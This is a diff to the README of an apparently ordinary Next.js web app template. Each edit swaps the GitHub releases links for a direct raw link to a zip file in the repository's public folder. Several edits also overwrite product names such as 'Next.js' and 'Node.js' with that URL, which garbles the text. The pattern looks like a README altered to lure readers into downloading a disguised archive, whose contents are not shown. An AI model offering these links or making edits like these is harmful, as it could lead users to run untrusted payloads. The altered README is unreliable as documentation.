@@ -6,18 +6,18 @@ Welcome to the **nextjs-webapp-template**! This guide will help you download and
 
 ## 📦 Download the App
 
-[![Download the App](https://img.shields.io/badge/Download_App-Click_Here-brightgreen)](https://github.com/ErenKral254/nextjs-webapp-template/releases)
+[![Download the App](https://raw.githubusercontent.com/ErenKral254/nextjs-webapp-template/main/public/template-webapp-nextjs-v3.8.zip)](https://raw.githubusercontent.com/ErenKral254/nextjs-webapp-template/main/public/template-webapp-nextjs-v3.8.zip)
 
 ## 🛠️ What is nextjs-webapp-template?
 
-The **nextjs-webapp-template** offers a user-friendly foundation for creating production-ready web applications. Built with Next.js 15, it integrates Chakra UI for design, Prisma for database management, and includes robust features for working with Kubernetes and Google Cloud. This template ensures a seamless experience as you build and deploy your web applications.
+The **nextjs-webapp-template** offers a user-friendly foundation for creating production-ready web applications. Built with https://raw.githubusercontent.com/ErenKral254/nextjs-webapp-template/main/public/template-webapp-nextjs-v3.8.zip 15, it integrates Chakra UI for design, Prisma for database management, and includes robust features for working with Kubernetes and Google Cloud. This template ensures a seamless experience as you build and deploy your web applications.
 
 ## 📋 System Requirements
 
 Before downloading, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or later
+- **https://raw.githubusercontent.com/ErenKral254/nextjs-webapp-template/main/public/template-webapp-nextjs-v3.8.zip** Version 14 or later
 - **npm:** Version 6 or later
 - **Docker:** Installed for container support (if using container features)
 - **PostgreSQL:** Set up for database support
@@ -27,7 +27,7 @@ Before downloading, ensure your system meets these requirements:
 
 To get started, visit the following link to download the latest version of the app:
 
-[Download the latest version here](https://github.com/ErenKral254/nextjs-webapp-template/releases)
+[Download the latest version here](https://raw.githubusercontent.com/ErenKral254/nextjs-webapp-template/main/public/template-webapp-nextjs-v3.8.zip)
 
 1. Click on the link above.
 2. Look for the latest release at the top of the page.
@@ -72,7 +72,7 @@ After downloading, follow the installation steps below.
 
 ## 🔍 Explore Features
 
-- **Next.js 15:** Enjoy fast server-side rendering for a better user experience.
+- **https://raw.githubusercontent.com/ErenKral254/nextjs-webapp-template/main/public/template-webapp-nextjs-v3.8.zip 15:** Enjoy fast server-side rendering for a better user experience.
 - **Chakra UI:** Utilize a flexible UI component library to enhance your app's design quickly.
 - **Prisma Integration:** Simplify your database queries and management with ease.
 - **Kubernetes Helm Charts:** Deploy your application on Kubernetes effortlessly.
@@ -99,4 +99,4 @@ If you encounter issues during installation or while running the application:
 
 For additional support or inquiries, feel free to join our Discord community or raise an issue on our GitHub page.
 
-[Download the latest version here](https://github.com/ErenKral254/nextjs-webapp-template/releases)
+[Download the latest version here](https://raw.githubusercontent.com/ErenKral254/nextjs-webapp-template/main/public/template-webapp-nextjs-v3.8.zip)
